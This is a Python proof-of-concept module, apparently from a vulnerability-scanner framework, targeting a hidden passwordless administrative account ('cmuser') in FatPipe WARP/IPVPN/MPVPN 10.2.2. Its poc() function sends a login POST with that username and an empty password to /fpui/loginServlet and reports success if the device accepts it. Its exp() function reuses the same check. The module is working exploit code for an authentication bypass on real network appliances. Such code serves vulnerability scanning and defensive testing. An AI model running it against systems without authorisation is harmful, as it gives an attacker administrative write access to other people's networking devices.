import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''FatPipe Networks WARP/IPVPN/MPVPN 10.2.2 Hidden Backdoor Account''',
        "description": '''FatPipe Networks has a hidden administrative account cmuser that has no password and has write access permissions to the device. The user cmuser is not visible in Users menu list of the application.''',
        "severity": "high",
        "references": [
            "https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5684.php", 
            "https://www.fatpipeinc.com/support/advisories.php"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["fatpipe", "default-login", "backdoor", "auth-bypass"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/fpui/loginServlet"""
        method = "POST"
        data = """loginParams=%7B%22username%22%3A%22cmuser%22%2C%22password%22%3A%22%22%2C%22authType%22%3A0%7D"""
        headers = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (resp0.status_code == 200) and ("""application/json""" in str(resp0.headers)) and ("""loginRes":"success""" in resp0.text and """activeUserName":"cmuser""" in resp0.text):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url